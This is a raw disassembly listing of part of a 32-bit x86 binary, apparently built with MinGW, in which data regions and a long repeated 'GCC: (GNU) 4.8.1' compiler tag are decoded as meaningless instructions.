  40df3d:	jle    0x40df7f
  40df3f:	add    BYTE PTR [eax],ah
  40df41:	jle    0x40df83
  40df43:	add    BYTE PTR [eax],ah
  40df45:	jle    0x40df87
  40df47:	add    BYTE PTR [eax+0x7e],dh
  40df4a:	inc    eax
  40df4b:	add    BYTE PTR [eax],ah
  40df4d:	jle    0x40df8f
  40df4f:	add    BYTE PTR [eax],ah
  40df51:	jle    0x40df93
  40df53:	add    BYTE PTR [eax],ah
  40df55:	jle    0x40df97
  40df57:	add    BYTE PTR [eax],ah
  40df59:	jle    0x40df9b
  40df5b:	add    BYTE PTR [eax],dh
  40df5d:	jnp    0x40df9f
  40df5f:	add    BYTE PTR [eax],ah
  40df61:	jle    0x40dfa3
  40df63:	add    BYTE PTR [eax],ah
  40df65:	jle    0x40dfa7
  40df67:	add    BYTE PTR [eax],ah
  40df69:	jle    0x40dfab
  40df6b:	add    BYTE PTR [eax],ah
  40df6d:	jle    0x40dfaf
  40df6f:	add    BYTE PTR [eax],ah
  40df71:	jle    0x40dfb3
  40df73:	add    BYTE PTR [eax],ah
  40df75:	jle    0x40dfb7
  40df77:	add    BYTE PTR [eax],ah
  40df79:	jle    0x40dfbb
  40df7b:	add    BYTE PTR [eax],ah
  40df7d:	jle    0x40dfbf
  40df7f:	add    ah,dh
  40df81:	jp     0x40dfc3
  40df83:	add    BYTE PTR [eax],ah
  40df85:	jle    0x40dfc7
  40df87:	add    BYTE PTR [eax+0x4000407a],dh
  40df8d:	jp     0x40dfcf
  40df8f:	add    BYTE PTR [edx],al
  40df91:	jp     0x40dfd3
  40df93:	add    BYTE PTR [ebp+0x70004079],ah
  40df99:	jns    0x40dfdb
  40df9b:	add    al,ah
  40df9d:	jns    0x40dfdf
  40df9f:	add    BYTE PTR [eax+0x7a],al
  40dfa2:	inc    eax
  40dfa3:	add    BYTE PTR [edx+0x79],dl
  40dfa6:	inc    eax
  40dfa7:	add    BYTE PTR [eax],ah
  40dfa9:	jle    0x40dfeb
  40dfab:	add    BYTE PTR [eax],dh
  40dfad:	jns    0x40dfef
  40dfaf:	add    BYTE PTR [ecx],al
  40dfb1:	jns    0x40dff3
  40dfb3:	add    BYTE PTR [eax+0x30004078],dh
  40dfb9:	jnp    0x40dffb
  40dfbb:	add    BYTE PTR [eax+0x78],ah
  40dfbe:	inc    eax
  40dfbf:	add    BYTE PTR [eax],ah
  40dfc1:	jle    0x40e003
  40dfc3:	add    BYTE PTR [eax],ah
  40dfc5:	jle    0x40e007
  40dfc7:	add    BYTE PTR [eax+edi*2],dl
  40dfca:	inc    eax
  40dfcb:	add    al,al
  40dfcd:	ja     0x40e00f
  40dfcf:	add    BYTE PTR [eax],dh
  40dfd1:	jnp    0x40e013
  40dfd3:	add    BYTE PTR [eax],ah
  40dfd5:	jle    0x40e017
  40dfd7:	add    BYTE PTR [eax],ah
  40dfd9:	jle    0x40e01b
  40dfdb:	add    BYTE PTR [eax],dh
  40dfdd:	jnp    0x40e01f
  40dfdf:	add    BYTE PTR [eax],ah
  40dfe1:	jle    0x40e023
  40dfe3:	add    al,al
  40dfe5:	ja     0x40e027
  40dfe7:	add    BYTE PTR [ecx+0x6e],cl
  40dfea:	imul   bp,WORD PTR [esi+0x69],0x7974
  40dff0:	add    BYTE PTR [esi+0x61],cl
  40dff3:	dec    esi
  40dff4:	add    BYTE PTR [eax],dh
  40dff6:	add    BYTE PTR [eax],al
  40dff8:	pop    edx
  40dff9:	test   DWORD PTR [eax+0x0],eax
  40dffc:	xchg   ebx,eax
  40dffd:	test   BYTE PTR [eax+0x0],al
  40e000:	xchg   ebx,eax
  40e001:	test   BYTE PTR [eax+0x0],al
  40e004:	les    eax,FWORD PTR [ebp-0x7a6fffc0]
  40e00a:	inc    eax
  40e00b:	add    BYTE PTR [eax],al
  40e00d:	add    al,al
  40e00f:	aas    
  40e010:	popa   
  40e011:	inc    ebx
  40e012:	outs   dx,DWORD PTR ds:[esi]
  40e013:	arpl   WORD PTR [edi-0x4cc02d79],sp
  40e019:	enter  0x8b60,0x28
  40e01d:	mov    al,dh
  40e01f:	aas    
  40e020:	sti    
  40e021:	jns    0x40dfc2
  40e023:	push   eax
  40e024:	adc    eax,DWORD PTR [ebx+edx*8+0x3f]
  40e028:	add    al,0xfa
  40e02a:	jge    0x40dfc9
  40e02c:	push   ss
  40e02d:	sub    eax,0x5a323c94
  40e032:	inc    edi
  40e033:	push   ebp
  40e034:	adc    eax,DWORD PTR [ebx+edx*8+0x3f]
  40e038:	add    BYTE PTR [eax],al
  40e03a:	cmp    BYTE PTR [edi],0x0
  40e03d:	add    BYTE PTR [eax],ah
  40e03f:	inc    ecx
  40e040:	add    BYTE PTR [eax],al
  40e042:	inc    eax
  40e043:	inc    eax
  40e044:	add    BYTE PTR [eax],al
  40e046:	loopne 0x40e088
  40e048:	add    BYTE PTR [eax],al
  40e04a:	mov    al,ds:0x40
  40e04f:	aas    
	...
  40e080:	add    eax,0x19000000
  40e085:	add    BYTE PTR [eax],al
  40e087:	add    BYTE PTR [ebp+0x0],bh
	...
  40e0c6:	lock aas 
  40e0c8:	add    BYTE PTR [eax],al
  40e0ca:	add    BYTE PTR [eax],al
  40e0cc:	add    BYTE PTR [eax],al
  40e0ce:	and    al,0x40
  40e0d0:	add    BYTE PTR [eax],al
  40e0d2:	add    BYTE PTR [eax],al
  40e0d4:	add    BYTE PTR [eax],al
  40e0d6:	pop    ecx
  40e0d7:	inc    eax
  40e0d8:	add    BYTE PTR [eax],al
  40e0da:	add    BYTE PTR [eax],al
  40e0dc:	add    BYTE PTR [eax-0x71],al
  40e0df:	inc    eax
  40e0e0:	add    BYTE PTR [eax],al
  40e0e2:	add    BYTE PTR [eax],al
  40e0e4:	add    BYTE PTR [eax+0x40c3],cl
  40e0ea:	add    BYTE PTR [eax],al
  40e0ec:	add    BYTE PTR [edx-0x8],ch
  40e0ef:	inc    eax
  40e0f0:	add    BYTE PTR [eax],al
  40e0f2:	add    BYTE PTR [eax],al
  40e0f4:	add    BYTE PTR [esi+ebp*1+0x41],0x0
  40e0fc:	rcl    BYTE PTR [edx],1
  40e0fe:	arpl   WORD PTR [ecx+0x0],ax
  40e101:	add    BYTE PTR [eax],al
  40e103:	add    BYTE PTR [edi+edx*8+0x4197],al
  40e10a:	add    BYTE PTR [eax],al
  40e10c:	gs int 0xcd
  40e10f:	inc    ecx
  40e110:	add    BYTE PTR [eax],al
  40e112:	add    BYTE PTR [eax],ah
  40e114:	pop    edi
  40e115:	mov    al,ds:0x4202
  40e11a:	add    al,ch
  40e11c:	jbe    0x40e166
  40e11e:	aaa    
  40e11f:	inc    edx
  40e120:	add    BYTE PTR [eax],al
  40e122:	add    BYTE PTR [edx+0x426d1a94],ah
  40e128:	add    BYTE PTR [eax],al
  40e12a:	inc    eax
  40e12b:	in     eax,0x9c
  40e12d:	xor    BYTE PTR [edx-0x6fffffbe],ah
  40e133:	push   ds
  40e134:	les    edi,FWORD PTR [esi+edx*8+0x34000042]
  40e13b:	es cmc 
  40e13d:	imul   ecx,DWORD PTR [ebx+eax*2],0x0
  40e141:	and    al,0x37
  40e144:	jns    0x40e109
  40e146:	inc    ecx
  40e147:	inc    ebx
  40e148:	add    BYTE PTR [eax+0x345785d8],ah
  40e14e:	jbe    0x40e193
  40e150:	add    al,cl
  40e152:	dec    esi
  40e153:	ins    DWORD PTR es:[di],dx
  40e155:	shr    DWORD PTR [ebx-0x6ec2ffbd],0x60
  40e15c:	in     al,0x58
  40e15e:	loope  0x40e1a3
  40e160:	inc    eax
  40e161:	mov    WORD PTR [ebp+0x15af1d78],?
  40e167:	inc    esp
  40e168:	push   eax
  40e169:	out    dx,eax
  40e16a:	loop   0x40e142
  40e16c:	in     al,0x1a
  40e16e:	dec    ebx
  40e16f:	inc    esp
  40e170:	xchg   edx,eax
  40e171:	aad    0x4d
  40e173:	push   es
  40e174:	iret   
  40e175:	lock add BYTE PTR [eax+eax*1+0x0],0x0
  40e17b:	add    BYTE PTR [eax],al
  40e17d:	add    BYTE PTR [eax],al
  40e17f:	add    BYTE PTR [ecx+ecx*4-0x2d4d6828],bh
  40e186:	pushf  
  40e187:	cmp    al,0x33
  40e189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e18a:	test   al,0xd5
  40e18c:	and    esi,esi
  40e18e:	dec    ecx
  40e18f:	cmp    DWORD PTR ds:0xfd44f4a7,edi
  40e195:	shld   DWORD PTR [edx],esi,cl
  40e198:	popf   
  40e199:	xchg   edi,eax
  40e19a:	mov    edi,cs
  40e19c:	or     BYTE PTR [edx+0x6f43255b],bh
  40e1a2:	lods   al,BYTE PTR ds:[esi]
  40e1a3:	sub    BYTE PTR fs:[esi],al
  40e1a6:	enter  0xa,0x0
	...
  40e1be:	add    BYTE PTR [eax],al
  40e1c0:	add    BYTE PTR [eax-0x3c86c820],al
  40e1c6:	inc    ecx
  40e1c7:	inc    ebx
  40e1c8:	pop    ss
  40e1c9:	outs   dx,BYTE PTR ds:[esi]
  40e1ca:	add    eax,0x93b8b5b5
  40e1cf:	inc    esi
  40e1d0:	cmc    
  40e1d1:	stc    
  40e1d2:	aas    
  40e1d3:	jmp    0x4d7930db
  40e1d8:	xor    bl,BYTE PTR ds:0x7748f930
  40e1de:	sbb    BYTE PTR [edx+0x3c],0xbf
  40e1e2:	jae    0x40e263
  40e1e4:	fisttp QWORD PTR [edi+0x15]
  40e1e7:	jne    0x40e1e9
	...
  40e1fd:	add    BYTE PTR [eax],al
  40e1ff:	add    BYTE PTR [ebp+0x0],ch
  40e202:	jae    0x40e204
  40e204:	jbe    0x40e206
  40e206:	arpl   WORD PTR [eax],ax
  40e208:	jb     0x40e20a
  40e20a:	je     0x40e20c
  40e20c:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40e211:	add    BYTE PTR [eax+eax*1+0x0],ch
  40e215:	add    BYTE PTR [edi+0x73],bl
  40e218:	gs je  0x40e27a
  40e21b:	outs   dx,DWORD PTR ds:[esi]
  40e21c:	jne    0x40e292
  40e21e:	jo     0x40e295
  40e220:	je     0x40e281
  40e222:	outs   dx,WORD PTR ds:[esi]
  40e224:	jb     0x40e293
  40e226:	popa   
  40e227:	je     0x40e229
  40e229:	pop    edi
  40e22a:	addr16 gs je 0x40e28d
  40e22e:	outs   dx,DWORD PTR ds:[esi]
  40e22f:	jne    0x40e2a5
  40e231:	jo     0x40e2a8
  40e233:	je     0x40e294
  40e235:	outs   dx,WORD PTR ds:[esi]
  40e237:	jb     0x40e2a6
  40e239:	popa   
  40e23a:	je     0x40e23c
  40e23c:	ins    DWORD PTR es:[edi],dx
  40e23d:	add    BYTE PTR [ebx+0x0],dh
  40e240:	jbe    0x40e242
  40e242:	arpl   WORD PTR [eax],ax
  40e244:	jb     0x40e246
  40e246:	je     0x40e248
  40e248:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40e24d:	add    BYTE PTR [eax+eax*1+0x0],ch
  40e251:	add    BYTE PTR [edi+0x5f],bl
  40e254:	pop    edi
  40e255:	ins    BYTE PTR es:[edi],dx
  40e256:	arpl   WORD PTR [edi+0x63],bx
  40e259:	outs   dx,DWORD PTR ds:[esi]
  40e25a:	fs gs jo 0x40e2bf
  40e25e:	addr16 gs pop edi
  40e261:	data16 jne 0x40e2d2
  40e264:	arpl   WORD PTR [eax],ax
  40e266:	pop    edi
  40e267:	pop    edi
  40e268:	ins    BYTE PTR es:[edi],dx
  40e269:	arpl   WORD PTR [edi+0x63],bx
  40e26c:	outs   dx,DWORD PTR ds:[esi]
  40e26d:	fs gs jo 0x40e2d2
  40e271:	add    BYTE PTR gs:[bx+0x43],al
  40e276:	inc    ebx
  40e277:	cmp    ah,BYTE PTR [eax]
  40e279:	sub    BYTE PTR [edi+0x4e],al
  40e27c:	push   ebp
  40e27d:	sub    DWORD PTR [eax],esp
  40e27f:	xor    al,0x2e
  40e281:	cmp    DWORD PTR [esi],ebp
  40e283:	xor    DWORD PTR [eax],eax
  40e285:	add    BYTE PTR [eax],al
  40e287:	add    BYTE PTR [edi+0x43],al
  40e28a:	inc    ebx
  40e28b:	cmp    ah,BYTE PTR [eax]
  40e28d:	sub    BYTE PTR [edi+0x4e],al
  40e290:	push   ebp
  40e291:	sub    DWORD PTR [eax],esp
  40e293:	xor    al,0x2e
  40e295:	cmp    DWORD PTR [esi],ebp
  40e297:	xor    al,BYTE PTR [eax]
  40e299:	add    BYTE PTR [eax],al
  40e29b:	add    BYTE PTR [edi+0x43],al
  40e29e:	inc    ebx
  40e29f:	cmp    ah,BYTE PTR [eax]
  40e2a1:	sub    BYTE PTR [edi+0x4e],al
  40e2a4:	push   ebp
  40e2a5:	sub    DWORD PTR [eax],esp
  40e2a7:	xor    al,0x2e
  40e2a9:	cmp    DWORD PTR [esi],ebp
  40e2ab:	xor    al,BYTE PTR [eax]
  40e2ad:	add    BYTE PTR [eax],al
  40e2af:	add    BYTE PTR [edi+0x43],al
  40e2b2:	inc    ebx
  40e2b3:	cmp    ah,BYTE PTR [eax]
  40e2b5:	sub    BYTE PTR [edi+0x4e],al
  40e2b8:	push   ebp
  40e2b9:	sub    DWORD PTR [eax],esp
  40e2bb:	xor    al,0x2e
  40e2bd:	cmp    DWORD PTR [esi],ebp
  40e2bf:	xor    DWORD PTR [eax],eax
  40e2c1:	add    BYTE PTR [eax],al
  40e2c3:	add    BYTE PTR [edi+0x43],al
  40e2c6:	inc    ebx
  40e2c7:	cmp    ah,BYTE PTR [eax]
  40e2c9:	sub    BYTE PTR [edi+0x4e],al
  40e2cc:	push   ebp
  40e2cd:	sub    DWORD PTR [eax],esp
  40e2cf:	xor    al,0x2e
  40e2d1:	cmp    DWORD PTR [esi],ebp
  40e2d3:	xor    DWORD PTR [eax],eax
  40e2d5:	add    BYTE PTR [eax],al
  40e2d7:	add    BYTE PTR [edi+0x43],al
  40e2da:	inc    ebx
  40e2db:	cmp    ah,BYTE PTR [eax]
  40e2dd:	sub    BYTE PTR [edi+0x4e],al
  40e2e0:	push   ebp
  40e2e1:	sub    DWORD PTR [eax],esp
  40e2e3:	xor    al,0x2e
  40e2e5:	cmp    DWORD PTR [esi],ebp
  40e2e7:	xor    DWORD PTR [eax],eax
  40e2e9:	add    BYTE PTR [eax],al
  40e2eb:	add    BYTE PTR [edi+0x43],al
  40e2ee:	inc    ebx
  40e2ef:	cmp    ah,BYTE PTR [eax]
  40e2f1:	sub    BYTE PTR [edi+0x4e],al
  40e2f4:	push   ebp
  40e2f5:	sub    DWORD PTR [eax],esp
  40e2f7:	xor    al,0x2e
  40e2f9:	cmp    DWORD PTR [esi],ebp
  40e2fb:	xor    DWORD PTR [eax],eax
  40e2fd:	add    BYTE PTR [eax],al
  40e2ff:	add    BYTE PTR [edi+0x43],al
  40e302:	inc    ebx
  40e303:	cmp    ah,BYTE PTR [eax]
  40e305:	sub    BYTE PTR [edi+0x4e],al
  40e308:	push   ebp
  40e309:	sub    DWORD PTR [eax],esp
  40e30b:	xor    al,0x2e
  40e30d:	cmp    DWORD PTR [esi],ebp
  40e30f:	xor    DWORD PTR [eax],eax
  40e311:	add    BYTE PTR [eax],al
  40e313:	add    BYTE PTR [edi+0x43],al
  40e316:	inc    ebx
  40e317:	cmp    ah,BYTE PTR [eax]
  40e319:	sub    BYTE PTR [edi+0x4e],al
  40e31c:	push   ebp
  40e31d:	sub    DWORD PTR [eax],esp
  40e31f:	xor    al,0x2e
  40e321:	cmp    DWORD PTR [esi],ebp
  40e323:	xor    DWORD PTR [eax],eax
  40e325:	add    BYTE PTR [eax],al
  40e327:	add    BYTE PTR [edi+0x43],al
  40e32a:	inc    ebx
  40e32b:	cmp    ah,BYTE PTR [eax]
  40e32d:	sub    BYTE PTR [edi+0x4e],al
  40e330:	push   ebp
  40e331:	sub    DWORD PTR [eax],esp
  40e333:	xor    al,0x2e
  40e335:	cmp    DWORD PTR [esi],ebp
  40e337:	xor    DWORD PTR [eax],eax
  40e339:	add    BYTE PTR [eax],al
  40e33b:	add    BYTE PTR [edi+0x43],al
  40e33e:	inc    ebx
  40e33f:	cmp    ah,BYTE PTR [eax]
  40e341:	sub    BYTE PTR [edi+0x4e],al
  40e344:	push   ebp
  40e345:	sub    DWORD PTR [eax],esp
  40e347:	xor    al,0x2e
  40e349:	cmp    DWORD PTR [esi],ebp
  40e34b:	xor    DWORD PTR [eax],eax
  40e34d:	add    BYTE PTR [eax],al
  40e34f:	add    BYTE PTR [edi+0x43],al
  40e352:	inc    ebx
  40e353:	cmp    ah,BYTE PTR [eax]
  40e355:	sub    BYTE PTR [edi+0x4e],al
  40e358:	push   ebp
  40e359:	sub    DWORD PTR [eax],esp
  40e35b:	xor    al,0x2e
  40e35d:	cmp    DWORD PTR [esi],ebp
  40e35f:	xor    DWORD PTR [eax],eax
  40e361:	add    BYTE PTR [eax],al
  40e363:	add    BYTE PTR [edi+0x43],al
  40e366:	inc    ebx
  40e367:	cmp    ah,BYTE PTR [eax]
  40e369:	sub    BYTE PTR [edi+0x4e],al
  40e36c:	push   ebp
  40e36d:	sub    DWORD PTR [eax],esp
  40e36f:	xor    al,0x2e
  40e371:	cmp    DWORD PTR [esi],ebp
  40e373:	xor    DWORD PTR [eax],eax
  40e375:	add    BYTE PTR [eax],al
  40e377:	add    BYTE PTR [edi+0x43],al
  40e37a:	inc    ebx
  40e37b:	cmp    ah,BYTE PTR [eax]
  40e37d:	sub    BYTE PTR [edi+0x4e],al
  40e380:	push   ebp
  40e381:	sub    DWORD PTR [eax],esp
  40e383:	xor    al,0x2e
  40e385:	cmp    DWORD PTR [esi],ebp
  40e387:	xor    DWORD PTR [eax],eax
  40e389:	add    BYTE PTR [eax],al
  40e38b:	add    BYTE PTR [edi+0x43],al
  40e38e:	inc    ebx
  40e38f:	cmp    ah,BYTE PTR [eax]
  40e391:	sub    BYTE PTR [edi+0x4e],al
  40e394:	push   ebp
  40e395:	sub    DWORD PTR [eax],esp
  40e397:	xor    al,0x2e
  40e399:	cmp    DWORD PTR [esi],ebp
  40e39b:	xor    DWORD PTR [eax],eax
  40e39d:	add    BYTE PTR [eax],al
  40e39f:	add    BYTE PTR [edi+0x43],al
  40e3a2:	inc    ebx
  40e3a3:	cmp    ah,BYTE PTR [eax]
  40e3a5:	sub    BYTE PTR [edi+0x4e],al
  40e3a8:	push   ebp
  40e3a9:	sub    DWORD PTR [eax],esp
  40e3ab:	xor    al,0x2e
  40e3ad:	cmp    DWORD PTR [esi],ebp
  40e3af:	xor    DWORD PTR [eax],eax
  40e3b1:	add    BYTE PTR [eax],al
  40e3b3:	add    BYTE PTR [edi+0x43],al
  40e3b6:	inc    ebx
  40e3b7:	cmp    ah,BYTE PTR [eax]
  40e3b9:	sub    BYTE PTR [edi+0x4e],al
  40e3bc:	push   ebp
  40e3bd:	sub    DWORD PTR [eax],esp
  40e3bf:	xor    al,0x2e
  40e3c1:	cmp    DWORD PTR [esi],ebp
  40e3c3:	xor    DWORD PTR [eax],eax
  40e3c5:	add    BYTE PTR [eax],al
  40e3c7:	add    BYTE PTR [edi+0x43],al
  40e3ca:	inc    ebx
  40e3cb:	cmp    ah,BYTE PTR [eax]
  40e3cd:	sub    BYTE PTR [edi+0x4e],al
  40e3d0:	push   ebp
  40e3d1:	sub    DWORD PTR [eax],esp
  40e3d3:	xor    al,0x2e
  40e3d5:	cmp    DWORD PTR [esi],ebp
  40e3d7:	xor    DWORD PTR [eax],eax
  40e3d9:	add    BYTE PTR [eax],al
  40e3db:	add    BYTE PTR [edi+0x43],al
  40e3de:	inc    ebx
  40e3df:	cmp    ah,BYTE PTR [eax]
  40e3e1:	sub    BYTE PTR [edi+0x4e],al
  40e3e4:	push   ebp
  40e3e5:	sub    DWORD PTR [eax],esp
  40e3e7:	xor    al,0x2e
  40e3e9:	cmp    DWORD PTR [esi],ebp
  40e3eb:	xor    DWORD PTR [eax],eax
  40e3ed:	add    BYTE PTR [eax],al
  40e3ef:	add    BYTE PTR [edi+0x43],al
  40e3f2:	inc    ebx
  40e3f3:	cmp    ah,BYTE PTR [eax]
  40e3f5:	sub    BYTE PTR [edi+0x4e],al
  40e3f8:	push   ebp
  40e3f9:	sub    DWORD PTR [eax],esp
  40e3fb:	xor    al,0x2e
  40e3fd:	cmp    DWORD PTR [esi],ebp
  40e3ff:	xor    DWORD PTR [eax],eax
  40e401:	add    BYTE PTR [eax],al
  40e403:	add    BYTE PTR [edi+0x43],al
  40e406:	inc    ebx
  40e407:	cmp    ah,BYTE PTR [eax]
  40e409:	sub    BYTE PTR [edi+0x4e],al
  40e40c:	push   ebp
  40e40d:	sub    DWORD PTR [eax],esp
  40e40f:	xor    al,0x2e
  40e411:	cmp    DWORD PTR [esi],ebp
  40e413:	xor    DWORD PTR [eax],eax
  40e415:	add    BYTE PTR [eax],al
  40e417:	add    BYTE PTR [edi+0x43],al
  40e41a:	inc    ebx
  40e41b:	cmp    ah,BYTE PTR [eax]
  40e41d:	sub    BYTE PTR [edi+0x4e],al
  40e420:	push   ebp
  40e421:	sub    DWORD PTR [eax],esp
  40e423:	xor    al,0x2e
  40e425:	cmp    DWORD PTR [esi],ebp
  40e427:	xor    DWORD PTR [eax],eax
  40e429:	add    BYTE PTR [eax],al
  40e42b:	add    BYTE PTR [edi+0x43],al
  40e42e:	inc    ebx
  40e42f:	cmp    ah,BYTE PTR [eax]
  40e431:	sub    BYTE PTR [edi+0x4e],al
  40e434:	push   ebp
  40e435:	sub    DWORD PTR [eax],esp
  40e437:	xor    al,0x2e
  40e439:	cmp    DWORD PTR [esi],ebp
  40e43b:	xor    DWORD PTR [eax],eax
  40e43d:	add    BYTE PTR [eax],al
  40e43f:	add    BYTE PTR [edi+0x43],al
  40e442:	inc    ebx
  40e443:	cmp    ah,BYTE PTR [eax]
  40e445:	sub    BYTE PTR [edi+0x4e],al
  40e448:	push   ebp
  40e449:	sub    DWORD PTR [eax],esp
  40e44b:	xor    al,0x2e
  40e44d:	cmp    DWORD PTR [esi],ebp
  40e44f:	xor    DWORD PTR [eax],eax
  40e451:	add    BYTE PTR [eax],al
  40e453:	add    BYTE PTR [edi+0x43],al
  40e456:	inc    ebx
  40e457:	cmp    ah,BYTE PTR [eax]
  40e459:	sub    BYTE PTR [edi+0x4e],al
  40e45c:	push   ebp
  40e45d:	sub    DWORD PTR [eax],esp
  40e45f:	xor    al,0x2e
  40e461:	cmp    DWORD PTR [esi],ebp
  40e463:	xor    al,BYTE PTR [eax]
  40e465:	add    BYTE PTR [eax],al
  40e467:	add    BYTE PTR [edi+0x43],al
  40e46a:	inc    ebx
  40e46b:	cmp    ah,BYTE PTR [eax]
  40e46d:	sub    BYTE PTR [edi+0x4e],al
  40e470:	push   ebp
  40e471:	sub    DWORD PTR [eax],esp
  40e473:	xor    al,0x2e
  40e475:	cmp    DWORD PTR [esi],ebp
  40e477:	xor    DWORD PTR [eax],eax
  40e479:	add    BYTE PTR [eax],al
  40e47b:	add    BYTE PTR [edi+0x43],al
  40e47e:	inc    ebx
  40e47f:	cmp    ah,BYTE PTR [eax]
  40e481:	sub    BYTE PTR [edi+0x4e],al
  40e484:	push   ebp
  40e485:	sub    DWORD PTR [eax],esp
  40e487:	xor    al,0x2e
  40e489:	cmp    DWORD PTR [esi],ebp
  40e48b:	xor    DWORD PTR [eax],eax
  40e48d:	add    BYTE PTR [eax],al
  40e48f:	add    BYTE PTR [edi+0x43],al
  40e492:	inc    ebx
  40e493:	cmp    ah,BYTE PTR [eax]
  40e495:	sub    BYTE PTR [edi+0x4e],al
  40e498:	push   ebp
  40e499:	sub    DWORD PTR [eax],esp
  40e49b:	xor    al,0x2e
  40e49d:	cmp    DWORD PTR [esi],ebp
  40e49f:	xor    DWORD PTR [eax],eax
  40e4a1:	add    BYTE PTR [eax],al
  40e4a3:	add    BYTE PTR [edi+0x43],al
  40e4a6:	inc    ebx
  40e4a7:	cmp    ah,BYTE PTR [eax]
  40e4a9:	sub    BYTE PTR [edi+0x4e],al
  40e4ac:	push   ebp
  40e4ad:	sub    DWORD PTR [eax],esp
  40e4af:	xor    al,0x2e
  40e4b1:	cmp    DWORD PTR [esi],ebp
  40e4b3:	xor    DWORD PTR [eax],eax
  40e4b5:	add    BYTE PTR [eax],al
  40e4b7:	add    BYTE PTR [edi+0x43],al
  40e4ba:	inc    ebx
  40e4bb:	cmp    ah,BYTE PTR [eax]
  40e4bd:	sub    BYTE PTR [edi+0x4e],al
  40e4c0:	push   ebp
  40e4c1:	sub    DWORD PTR [eax],esp
  40e4c3:	xor    al,0x2e
  40e4c5:	cmp    DWORD PTR [esi],ebp
  40e4c7:	xor    DWORD PTR [eax],eax
  40e4c9:	add    BYTE PTR [eax],al
  40e4cb:	add    BYTE PTR [edi+0x43],al
  40e4ce:	inc    ebx
  40e4cf:	cmp    ah,BYTE PTR [eax]
  40e4d1:	sub    BYTE PTR [edi+0x4e],al
  40e4d4:	push   ebp
  40e4d5:	sub    DWORD PTR [eax],esp
  40e4d7:	xor    al,0x2e
  40e4d9:	cmp    DWORD PTR [esi],ebp
  40e4db:	xor    DWORD PTR [eax],eax
  40e4dd:	add    BYTE PTR [eax],al
  40e4df:	add    BYTE PTR [edi+0x43],al
  40e4e2:	inc    ebx
  40e4e3:	cmp    ah,BYTE PTR [eax]
  40e4e5:	sub    BYTE PTR [edi+0x4e],al
  40e4e8:	push   ebp
  40e4e9:	sub    DWORD PTR [eax],esp
  40e4eb:	xor    al,0x2e
  40e4ed:	cmp    DWORD PTR [esi],ebp
  40e4ef:	xor    DWORD PTR [eax],eax
  40e4f1:	add    BYTE PTR [eax],al
  40e4f3:	add    BYTE PTR [edi+0x43],al
  40e4f6:	inc    ebx
  40e4f7:	cmp    ah,BYTE PTR [eax]
  40e4f9:	sub    BYTE PTR [edi+0x4e],al
  40e4fc:	push   ebp
  40e4fd:	sub    DWORD PTR [eax],esp
  40e4ff:	xor    al,0x2e
  40e501:	cmp    DWORD PTR [esi],ebp
  40e503:	xor    DWORD PTR [eax],eax
  40e505:	add    BYTE PTR [eax],al
  40e507:	add    BYTE PTR [edi+0x43],al
  40e50a:	inc    ebx
  40e50b:	cmp    ah,BYTE PTR [eax]
  40e50d:	sub    BYTE PTR [edi+0x4e],al
  40e510:	push   ebp
  40e511:	sub    DWORD PTR [eax],esp
  40e513:	xor    al,0x2e
  40e515:	cmp    DWORD PTR [esi],ebp
  40e517:	xor    DWORD PTR [eax],eax
  40e519:	add    BYTE PTR [eax],al
  40e51b:	add    BYTE PTR [edi+0x43],al
  40e51e:	inc    ebx
  40e51f:	cmp    ah,BYTE PTR [eax]
  40e521:	sub    BYTE PTR [edi+0x4e],al
  40e524:	push   ebp
  40e525:	sub    DWORD PTR [eax],esp
  40e527:	xor    al,0x2e
  40e529:	cmp    DWORD PTR [esi],ebp
  40e52b:	xor    DWORD PTR [eax],eax
  40e52d:	add    BYTE PTR [eax],al
  40e52f:	add    BYTE PTR [edi+0x43],al
  40e532:	inc    ebx
  40e533:	cmp    ah,BYTE PTR [eax]
  40e535:	sub    BYTE PTR [edi+0x4e],al
  40e538:	push   ebp
  40e539:	sub    DWORD PTR [eax],esp
  40e53b:	xor    al,0x2e
  40e53d:	cmp    DWORD PTR [esi],ebp
  40e53f:	xor    DWORD PTR [eax],eax
  40e541:	add    BYTE PTR [eax],al
  40e543:	add    BYTE PTR [edi+0x43],al
  40e546:	inc    ebx
  40e547:	cmp    ah,BYTE PTR [eax]
  40e549:	sub    BYTE PTR [edi+0x4e],al
  40e54c:	push   ebp
  40e54d:	sub    DWORD PTR [eax],esp
  40e54f:	xor    al,0x2e
  40e551:	cmp    DWORD PTR [esi],ebp
  40e553:	xor    DWORD PTR [eax],eax
  40e555:	add    BYTE PTR [eax],al
  40e557:	add    BYTE PTR [edi+0x43],al
  40e55a:	inc    ebx
  40e55b:	cmp    ah,BYTE PTR [eax]
  40e55d:	sub    BYTE PTR [edi+0x4e],al
  40e560:	push   ebp
  40e561:	sub    DWORD PTR [eax],esp
  40e563:	xor    al,0x2e
  40e565:	cmp    DWORD PTR [esi],ebp
  40e567:	xor    DWORD PTR [eax],eax
  40e569:	add    BYTE PTR [eax],al
  40e56b:	add    BYTE PTR [edi+0x43],al
  40e56e:	inc    ebx
  40e56f:	cmp    ah,BYTE PTR [eax]
  40e571:	sub    BYTE PTR [edi+0x4e],al
  40e574:	push   ebp
  40e575:	sub    DWORD PTR [eax],esp
  40e577:	xor    al,0x2e
  40e579:	cmp    DWORD PTR [esi],ebp
  40e57b:	xor    DWORD PTR [eax],eax
  40e57d:	add    BYTE PTR [eax],al
  40e57f:	add    BYTE PTR [edi+0x43],al
  40e582:	inc    ebx
  40e583:	cmp    ah,BYTE PTR [eax]
  40e585:	sub    BYTE PTR [edi+0x4e],al
  40e588:	push   ebp
  40e589:	sub    DWORD PTR [eax],esp
  40e58b:	xor    al,0x2e
  40e58d:	cmp    DWORD PTR [esi],ebp
  40e58f:	xor    DWORD PTR [eax],eax
  40e591:	add    BYTE PTR [eax],al
  40e593:	add    BYTE PTR [edi+0x43],al
  40e596:	inc    ebx
  40e597:	cmp    ah,BYTE PTR [eax]
  40e599:	sub    BYTE PTR [edi+0x4e],al
  40e59c:	push   ebp
  40e59d:	sub    DWORD PTR [eax],esp
  40e59f:	xor    al,0x2e
  40e5a1:	cmp    DWORD PTR [esi],ebp
  40e5a3:	xor    al,BYTE PTR [eax]
  40e5a5:	add    BYTE PTR [eax],al
  40e5a7:	add    BYTE PTR [edi+0x43],al
  40e5aa:	inc    ebx
  40e5ab:	cmp    ah,BYTE PTR [eax]
  40e5ad:	sub    BYTE PTR [edi+0x4e],al
  40e5b0:	push   ebp
  40e5b1:	sub    DWORD PTR [eax],esp
  40e5b3:	xor    al,0x2e
